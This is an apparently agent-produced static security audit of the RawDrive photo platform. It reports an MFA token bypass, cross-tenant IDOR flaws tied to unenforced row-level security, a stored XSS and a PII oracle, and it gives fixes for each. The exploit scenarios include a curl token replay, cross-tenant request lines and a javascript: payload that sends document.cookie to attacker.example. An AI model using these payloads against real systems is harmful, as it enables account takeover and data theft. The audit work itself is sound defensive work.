# RawDrive — Full-Application Security Audit

| | |
|---|---|
| **Date** | 2026-05-30 |
| **Scope** | Entire application — Go backend (`backend/`) + Next.js frontend (`frontend/`) + supply chain |
| **Branch / commit** | `main` @ `1d2b6b6` |
| **Method** | 9 parallel domain finders → adversarial false-positive verification per finding → confidence gate (≥ 8/10 retained) |
| **Coverage stats** | 29 review agents · 20 raw findings · **12 confirmed** · 8 rejected (verified false positives) |
| **Status** | OPEN — awaiting triage/remediation |

> This is a **static source review**. No findings were validated against a running instance. Recommend a follow-up dynamic/pen-test pass (`/cobolt-pentest`) against localhost once the fixes below land.

---

## Executive summary

The single most important result is a **systemic multi-tenant isolation failure**. The platform's tenant boundary is supposed to be enforced by Postgres Row-Level Security (RLS) keyed on `current_setting('app.workspace_id')`, set per request by `TenantContext`. Multiple verifiers independently established that **RLS is effectively dormant in production**, which turns a whole class of "defense-in-depth" handler omissions into **live cross-tenant IDOR vulnerabilities**.

There is also a **complete TOTP MFA bypass** (Vuln 1) that is independent of the tenancy issue and is the cheapest high-impact fix available.

### Severity breakdown

| Severity | Count | Findings |
|---|---|---|
| HIGH | 8 | V1 (MFA bypass), V2 (storage proxy), V3 (album IDOR), V4 (gallery IDOR), V5 (asset IDOR), V6 (proofing IDOR), V7 (share-link IDOR), V8 (messaging IDOR) |
| MEDIUM | 3 | V9 (MFA session family), V10 (stored XSS), V11 (consent PII oracle) |
| LOW (noted, sub-threshold) | 1 | Cart IDOR (`cart_handler.go:52`, conf 7) |

---

## Cross-cutting root cause: RLS is not enforced in production

Every IDOR finding below traces to the same infrastructure gap. Verifiers established all of the following from source:

1. **No `FORCE ROW LEVEL SECURITY`.** Migrations only `ENABLE ROW LEVEL SECURITY`. The application connects via `DATABASE_URL` as the **table-owner role**, and owners bypass non-forced RLS entirely.
2. **No `SET ROLE rawdrive_app` in the request path.** The non-owner role that RLS policies target is only ever set in `backend/internal/.../test_helpers.go` — i.e. RLS is *test-only*.
3. **Connection-affinity bug.** `db_context.go` runs `set_config('app.workspace_id', …, false)` on a connection acquired from `pgxpool` and then released; the repository query later acquires a *different* pooled connection, so the session variable is not reliably bound to the request's queries.
4. **Tables missing any policy.** `share_links` and `proofing_selections` have **no RLS policy at all** and no `workspace_id` column — they were never added to the isolation layer that protects ~70 sibling tables (migration 008).
5. **`TenantContext`'s URL guard is narrow.** Its cross-workspace check only fires on paths containing `/workspaces/`; the `/api/v1/galleries/...`, `/api/v1/assets/...`, `/api/v1/albums/...` routes do not match it.

**Strategic remediation (do this once, fixes the cluster):**

- Add `FORCE ROW LEVEL SECURITY` to every tenant table.
- Connect/`SET ROLE` as a **non-owner** application role in production.
- Fix per-request connection affinity (run `set_config` + the request's queries inside the *same* acquired connection / transaction).
- Add RLS policies (and a `workspace_id` column) to `share_links` and `proofing_selections`.
- **In parallel**, add explicit `WHERE workspace_id = $caller` predicates / ownership checks in the named handlers (defense in depth — do not rely on RLS alone).

---

## HIGH severity findings

### V1 — Auth Bypass: MFA challenge token accepted as a full access token

| | |
|---|---|
| **File** | `backend/internal/auth/auth.go:326` (`ParseAccessToken`); issuer `backend/internal/auth/mfa_handler.go:787` |
| **Category** | `auth_bypass` |
| **Severity** | HIGH |
| **Confidence** | 9/10 |

**Description.** `Handler.Login` issues an MFA-challenge JWT to TOTP-enrolled users *before* the second factor is verified, returning it as `mfa_token`. That token is signed with the **same RS256 key** as access tokens and carries the full identity claim set (`sub`, `workspace_id`, `role`, `platform_role`, `state_id`); the only difference is a `purpose=mfa_challenge` claim. `ParseAccessToken` (used by `middleware.JWTAuth` on every authenticated route) validates only signing method, signature, and expiry — it **never inspects `purpose`**. A sibling `parseChallengeRaw` *does* enforce `purpose==mfa_challenge`, proving challenge tokens are meant to be a distinct credential class, but `ParseAccessToken` has no reciprocal rejection. Only routes wrapped in `RequireMFA` (mounted only when `MFA_ENFORCE_PHOTOGRAPHERS=1`, off by default) check `mfa_verified`; the broad gallery/asset/download surface does not.

**Exploit scenario.** An attacker who phished/credential-stuffed only the password of an MFA-enrolled photographer/admin POSTs `email`+`password` to `/auth/login`, receives `401 {"mfa_required":true,"mfa_token":"<JWT>","challenge":"totp"}`, then replays it directly:
```
curl -H "Authorization: Bearer <mfa_token>" https://host/api/v1/galleries
```
`JWTAuth` accepts it with the victim's role/platform_role for the 5-minute challenge lifetime. The mandatory TOTP step-up — the exact control meant to stop password phishing/stuffing — is never exercised.

**Recommendation.** Give access tokens a distinct `purpose=access`/`typ` claim in `GenerateAccessToken`/`generateAccessTokenUnlocked`, and make `ParseAccessToken` **fail closed** when `purpose` is absent or is not `access` (equivalently, explicitly reject `purpose=mfa_challenge`). The challenge and access primitives must not be interchangeable.

---

### V2 — IDOR: `/storage/*` proxy authenticates the token but never authorizes the object key

| | |
|---|---|
| **File** | `backend/cmd/api/main.go:2312` (also reported as `:2328` — same defect) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 9/10 |

**Description.** The `/storage/*` streaming proxy is the sole gate protecting original uploads (keys of the form `<workspaceID>/<uploadID>/original.<ext>`). For non-thumbnail keys it requires a token and validates it with `jwtSvc.ParseAccessToken` — but **discards the returned claims** (`if _, err := jwtSvc.ParseAccessToken(...)`), then streams `storageProvider.Get(ctx, key)` for *any* key. The token proves only that the caller is *some* valid user; the workspace embedded in the requested key is never compared against the caller's. Additionally, any `thumbnails/*` key is served **fully anonymously**.

**Exploit scenario.** Chained with V5, an attacker reads a victim asset to learn its `StorageKey` (e.g. `4f3.../a1b2.../original.cr2`), then:
```
GET /storage/4f3.../a1b2.../original.cr2?token=<attacker's own valid JWT>
```
streams another studio's full-resolution original RAW/JPEG. `asset_handler.go:232` returns `download_url: "/storage/" + asset.StorageKey` to clients, so keys are not secret.

**Recommendation.** After `ParseAccessToken`, extract `workspace_id` from the claims and require the first path segment of `key` to equal that workspace UUID (or look up the asset row by `storage_key` scoped to the workspace). Reject mismatches with 404. Re-evaluate serving `thumbnails/*` with zero authentication.

---

### V3 — IDOR: Album read/mutate endpoints have no gallery/workspace ownership check

| | |
|---|---|
| **File** | `backend/internal/handler/album_handler.go:82` (`GetByID`, `ListAssets`, `AddAssets`, `Delete`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 9/10 |

**Description.** All four handlers operate purely on the `{id}` URL param. `AlbumService` passes it through and `AlbumRepo` runs `WHERE id = $1` / `WHERE album_id = $1` / `DELETE FROM albums WHERE id=$1` with **no `gallery_id`/`workspace_id` predicate**. `AddAssets` additionally accepts arbitrary `asset_id` values in the body and links them with no ownership check on the album *or* the assets (via an `ON CONFLICT` upsert).

**Exploit scenario.** An authenticated W1 user calls `DELETE /api/v1/albums/{W2-album-uuid}` to delete another tenant's album; `POST /api/v1/albums/{album}/assets {"asset_ids":["<W2-asset>"]}` to corrupt cross-tenant album membership; or `GET /api/v1/albums/{W2-album-uuid}/assets` to disclose another tenant's asset list.

**Recommendation.** Thread the caller's `workspace_id` through `AlbumService` and the repo; join `albums → galleries` and enforce `galleries.workspace_id = caller workspace` before any read/mutation; reject `asset_ids` whose owning workspace differs from the album's.

---

### V4 — IDOR: `GalleryHandler.GetByID` and `SoftDelete` skip the workspace check used by every sibling route

| | |
|---|---|
| **File** | `backend/internal/handler/gallery_handler.go:597` (`SoftDelete`), `:237` (`GetByID`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 8/10 |

**Description.** `SoftDelete` and `GetByID` call `gallerySvc.SoftDelete/GetByID(ctx, id)` with no workspace verification; `GalleryRepo.SoftDelete` deletes by `WHERE id=$1` only. Sibling handlers in the **same file** — `Update` (275), `LinkRelationships` (443), `WorkspaceSummary` (515), `AddAsset` (666) — all enforce `if gallery.WorkspaceID != workspaceID { 403 }`. These two were missed.

**Exploit scenario.** `DELETE /api/v1/galleries/{W2-gallery-uuid}` soft-deletes another tenant's entire gallery (cascading contact-link cleanup), destroying client deliverables; `GET /api/v1/galleries/{W2-gallery-uuid}` returns W2's full gallery record (client links, settings).

**Recommendation.** Mirror the existing pattern — load the gallery, compare `gallery.WorkspaceID` to `getWorkspaceID(r)`, return 404 on mismatch before reading/deleting; or push `workspace_id` into `GalleryRepo.SoftDelete`'s `WHERE` clause.

---

### V5 — IDOR: Asset `GetByID`/`Download`/`SoftDelete` are not workspace-scoped

| | |
|---|---|
| **File** | `backend/internal/handler/asset_handler.go:75` (`GetByID`), `:189` (`Download`), `:248` (`SoftDelete`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 8/10 |

**Description.** All three handlers parse an asset UUID and call `assetSvc.GetByID/SoftDelete(ctx, id)` with only the ID. Service (`asset_service.go:38/69`) and repo (`asset_repo.go:111` `WHERE id = $1`) do **no** workspace filtering. A scoped `GetByIDAndWorkspace` (`asset_repo.go:338`) exists but is never called here, even though `Upload`/`List` *do* use `getWorkspaceID` — a selective omission.

> **Verifier dispute (resolved).** One verifier rejected this at confidence 5, believing RLS (migration 061 `assets_isolation`) neutralizes it. The verifier that confirmed it at confidence 8 demonstrated RLS is not wired for production (no `FORCE`, owner role, pooled `set_config`). Per the cross-cutting root cause, **treat as live**.

**Exploit scenario.** An attacker in a low-tier workspace issues `GET /api/v1/assets/<victim-asset-uuid>` to read the victim's asset record incl. `StorageKey` and `download_url`, then `DELETE /api/v1/assets/<victim-asset-uuid>` to soft-delete a competitor's photos.

**Recommendation.** Replace `assetSvc.GetByID(ctx, id)` with `repo.GetByIDAndWorkspace(ctx, id, workspaceID)` (already implemented); add a `workspaceID` parameter to `SoftDelete` so the UPDATE includes `AND workspace_id = $2`. Return 404 on mismatch to avoid existence oracles.

---

### V6 — IDOR: Proofing selections readable/writable cross-tenant via `gallery_id` (client PII export)

| | |
|---|---|
| **File** | `backend/internal/handler/proofing_handler.go:30` (`ListByGallery`, `export.csv`, `PATCH .../proofing/{selectionId}`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 9/10 |

**Description.** The dashboard proofing endpoints pass the gallery ID straight to `ProofingRepo`, whose SQL filters **only by `gallery_id`** with no workspace predicate, on the shared pool. `proofing_selections` has **no RLS policy** (0 matches across all migrations) and no `workspace_id` column. `TenantContext`'s cross-workspace URL guard only fires on `/workspaces/` paths, which these routes do not match.

**Exploit scenario.** An attacker in a free workspace calls `GET /api/v1/galleries/<victim-gallery-id>/proofing/export.csv` and receives the victim studio's full client CSV — **`client_name`, `client_email`, notes, selected photo IDs**. They can also `PATCH .../proofing/{selectionId}` to sabotage another studio's client picks. Gallery UUIDs leak via public `/g/<slug>` suffixes and share emails.

**Recommendation.** Pass JWT `workspace_id` into `ProofingService.ListByGallery/UpdateStatus` and add `AND workspace_id = $N` (or join `galleries`); verify the gallery belongs to the caller before any proofing access. Add an RLS policy on `proofing_selections` and fix the pooled-connection RLS bug.

---

### V7 — IDOR: Share links of any gallery listable/revocable/creatable; leaks tokens, PINs, recipient emails

| | |
|---|---|
| **File** | `backend/internal/handler/share_link_handler.go:230` (`ListByGallery`), `:43` (`Create`), `:289` (`Revoke`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 8/10 |

**Description.** `Create` (`POST /api/v1/galleries/{id}/share`), `ListByGallery` (`GET .../share`), and `Revoke` (`DELETE .../share/{linkId}`) filter only by `gallery_id`/link id (`share_link_repo.go:87/138`) with no workspace predicate. `share_links` has **no RLS policy and no `workspace_id` column** — omitted from the isolation layer protecting ~70 sibling tables.

**Exploit scenario.** With any valid workspace JWT, `GET /api/v1/galleries/<victim-gallery-id>/share` enumerates the victim's share links and their `Permissions` map (`allowed_emails`, `recipient_emails`, channel, message, PIN-protection state). The attacker copies a token to access the victim's private gallery, `DELETE`s the studio's live client-delivery links (breaking delivery), or `POST`s a new download-enabled public link against the victim gallery.

**Recommendation.** Add workspace scoping to all `share_link` queries (filter by JWT `workspace_id` or join `galleries`); verify gallery/link ownership before list/create/revoke. Add an RLS policy on `share_links`. Do not treat `gallery_id` as an authorization boundary.

---

### V8 — IDOR: Channel messages endpoint discloses private cross-tenant chat

| | |
|---|---|
| **File** | `backend/internal/handler/messaging_handler.go:95` (`GetMessages`) |
| **Category** | `idor` |
| **Severity** | HIGH |
| **Confidence** | 8/10 |

**Description.** `GetMessages` (`GET /api/v1/messages/channels/{channelId}/messages`) reads `channelId` from the URL and calls `repo.ListMessages(channelID, ...)` with **no `getWorkspaceID` call and no membership check**. The query filters only `WHERE channel_id = $1` and returns full plaintext `body`, `sender_id`, `attachment_url`, `workspace_id`. It is the only message-read path missing scoping — `SearchMessages` adds `AND workspace_id = $2` (`messaging_repo.go:215`), and `Edit/Delete` check `SenderID == userID`.

**Exploit scenario.** An authenticated user supplies a channel UUID belonging to another workspace (enumeration, leaked link, SSE topic string, or a *former* membership they were removed from) and receives up to 50 of that workspace's private messages — internal/team chat content and sender PII — across the tenant boundary.

**Recommendation.** Resolve the channel and enforce `channel.workspace_id == getWorkspaceID(r)` (and channel membership for member-only channels), returning 404/403 on mismatch; or add a `workspace_id` + membership predicate to `ListMessages`. Fail closed when workspace context is absent.

---

## MEDIUM severity findings

### V9 — Session management: MFA-verified refresh sessions use a static, predictable family ID, breaking revocation

| | |
|---|---|
| **File** | `backend/internal/auth/mfa_handler.go:478` (`VerifyTOTP`), `:606` (`VerifyRecoveryCode`) |
| **Category** | `auth_bypass` (session management) |
| **Severity** | MEDIUM |
| **Confidence** | 8/10 |

**Description.** `VerifyTOTP` and `VerifyRecoveryCode` mint the refresh session with a hard-coded family ID `"family-"+claims.Sub`, unlike every password path which uses random `"family-"+uuid.New()` (`handler.go:501/578/719`). The family ID is the unit of revocation, and `IsFamilyRevoked` returns true if **any** row for that family is revoked (no pruning). After one logout (which permanently marks `family-<sub>` revoked), the next MFA login reuses the same family and `RotateRefreshToken` rejects every refresh — forcing full re-auth (incl. TOTP) on each access-token expiry. It also collapses all of a user's MFA sessions into one family, defeating per-device revocation and `MaxSessions`. The family ID is fully predictable from the user UUID.

**Exploit scenario.** Primarily self-inflicted availability + loss of revocation granularity: an admin who logs out can no longer refresh after the next MFA login; revoking one device revokes all MFA sessions; concurrent-session limits cannot be enforced per session.

**Recommendation.** Use `"family-"+uuid.New().String()` in `VerifyTOTP` and `VerifyRecoveryCode`, matching the password path. Family IDs must be unique per session and unpredictable.

---

### V10 — Stored XSS: `javascript:` URI via unvalidated chat `attachment_url` rendered in `<a href>`

| | |
|---|---|
| **File** | `frontend/src/app/(dashboard)/messages/page.tsx:466` |
| **Category** | `xss` |
| **Severity** | MEDIUM |
| **Confidence** | 8/10 |

**Description.** Chat messages render the server-returned `attachment_url` directly into an anchor `href` with no scheme allow-list: `<a href={msg.attachment_url} target="_blank" rel="noopener noreferrer">`. `attachment_url` is a free-form string on both the `Message` type and the `sendMessage` request body (`messaging.ts:19,65`), flowing from an authenticated sender, persisted server-side, and delivered to *other* channel members. React does **not** neutralize `javascript:` URIs in a runtime-string `href` (dev-mode warning only). The codebase validates comparable sinks elsewhere (`RechargeModal.tsx:114` `startsWith("https:")`), so the missing guard is an inconsistency, not an intended exception.

**Exploit scenario.** An authenticated member sends a message with `attachment_url = "javascript:fetch('https://attacker.example/x?c='+encodeURIComponent(document.cookie))"`. When a recipient clicks the rendered "Attachment" link, the script executes in their origin with their session (data exfiltration, authenticated API calls) — stored XSS against every member who clicks.

**Recommendation.** Add a shared `safeHttpUrl(input): string | null` helper that parses with `new URL()` in try/catch and only returns the value when `protocol === 'https:'` (optionally `http:`), rejecting `javascript:`/`data:`/`vbscript:`/unparseable. Use it for all user-derived `href`/`src` sinks, and enforce the same allow-list **server-side** on message create.

---

### V11 — Data exposure: Unauthenticated global consent-status disclosure by email (PII / membership oracle)

| | |
|---|---|
| **File** | `backend/internal/handler/consent_handler.go:133` (`GetStatus`); route `routes_m2.go:498` |
| **Category** | `idor` / PII disclosure |
| **Severity** | MEDIUM |
| **Confidence** | 8/10 |

**Description.** `GET /api/v1/public/consent/status?email=<addr>` is mounted on the explicitly no-auth public router and calls `ConsentService.GetConsentStatus(email)` → `consentRepo.ListByEmail(email)` (`WHERE visitor_email = $1`) with **no gallery/workspace scoping**. It returns the latest per-purpose consent grant/withdrawal map for that email across the **entire platform**, with no proof the caller controls the email.

**Exploit scenario.** An attacker scripts the endpoint over an email list. A non-empty grant map confirms the person is a client of *some* RawDrive studio and reveals which marketing/analytics purposes they granted/withdrew — usable for targeted phishing and platform-membership harvesting. This is consent data under India's DPDP regime, so unauthenticated cross-tenant disclosure is also a compliance exposure.

**Recommendation.** Do not expose consent status to anonymous callers keyed solely on email. Bind the lookup to `(gallery_id, email)` and require the gallery session/share token the visitor already holds, proving control of the email/session.

---

## Rejected findings (verified false positives, confidence < 8)

These were surfaced by finders but **dismissed** by adversarial verification. Recorded for traceability and to prevent re-litigation.

| Finding | File | Conf | Why rejected |
|---|---|---|---|
| `mfa_verified` downgraded to false on refresh after workspace change | `auth/handler.go:762` | 3 | Real bug but **fails closed** — downgrades MFA to *false*, locking out the legit user; never grants `mfa_verified=true` to an attacker. Availability defect, not auth bypass. |
| Asset IDOR (duplicate, RLS-neutralized view) | `asset_handler.go:67` | 5 | Same code as V5; this verifier believed RLS (migration 061) neutralizes it. Superseded by the confirmed view (RLS dormant in prod). **Fix still required.** |
| Chunked-upload session hijack by UUID | `chunked_upload.go:508` | 5 | Missing workspace check is real, but exploitation needs the victim's random v4 `tus_upload_id`; no cross-tenant leak channel found (UUIDs treated as unguessable). |
| Object-key injection via Content-Type extension | `chunked_upload.go:423` | 2 | Injected suffix only *appends* within the server-controlled `<ws>/<uuid>/` prefix; key never starts with `thumbnails/`, `..` opaque on S3/B2. No traversal/escape. |
| `thumbnails/` prefix served anonymously | `main.go:2326` | 3 | Intentional public-gallery design; keys are server-generated UUIDs (Get-only, no List). Same bytes already served by `/g/{slug}`. |
| RLS set on throwaway pooled connection | `middleware/db_context.go:29` | 3 | Real footgun (and underlies why V3–V8 are live), but the RLS predicate fails **closed** (empty GUC → 0 rows); not itself a cross-tenant *leak*. **Fix it as part of the cluster.** |
| PhonePe verify doesn't validate paid amount | `subscription_upgrade_handler.go:512` | 2 | Order amount is server-fixed from price maps; verify body carries no client amount; relies on trusted gateway misreporting (excluded). |
| Unauthenticated cart read/clear by guessed email | `cart_handler.go:52` | 7 | Confirmed missing-ownership IDOR, but low impact (cart contents + nuisance clear, gated on knowing the victim email; server-side pricing). Just below threshold — **worth fixing.** |

---

## Remediation plan (priority order)

1. **V1 — MFA bypass.** Add `purpose`/`typ` enforcement to `ParseAccessToken`. Smallest change, defeats the entire second factor. **Do first.**
2. **The IDOR cluster (V2–V8) + RLS wiring.** Shared root cause. Add `FORCE ROW LEVEL SECURITY`, run as a non-owner role, fix per-request connection affinity, add RLS policies for `share_links` and `proofing_selections`, **and** add explicit `workspace_id` predicates/ownership checks in each named handler. Highest-impact strategic fix.
3. **V9–V11 + cart IDOR.** Scoped independent fixes: random MFA refresh family ID, `safeHttpUrl` allow-list for `href`/`src` sinks (client + server), scope the consent-status lookup to a gallery session, add ownership proof to cart endpoints.
4. **Follow-up.** Re-run this audit after fixes; add a dynamic pen-test pass (`/cobolt-pentest`) on localhost; add regression tests asserting cross-tenant 404/403 for every `{id}` route and a unit test that `ParseAccessToken` rejects `purpose=mfa_challenge`.

---

## Methodology & caveats

- **Finder domains (9):** backend-auth, backend-injection, backend-authz-idor, backend-secrets-crypto, backend-upload-storage, backend-api-misc, frontend, supply-chain, data-exposure.
- **Verification:** each raw finding was re-examined by an independent adversarial reviewer instructed to *refute* it and to apply the standard false-positive exclusion list (DoS, secrets-at-rest, rate-limiting, outdated-deps, theoretical races, client-side authz, path-only SSRF, etc.). Only findings scoring **≥ 8/10** with a concrete untrusted-input attack path were retained.
- **Notably clean:** the **supply-chain** and **secrets/crypto** and **SQL/command-injection** finders produced **no** confirmed findings — dependency manifests, lifecycle scripts, credential resolution (`platform_settings` → env → disable), and parameterized queries held up.
- **Limitation:** static review only; no exploit was run end-to-end. Severities reflect code-path analysis. Validate against a running instance before closing.
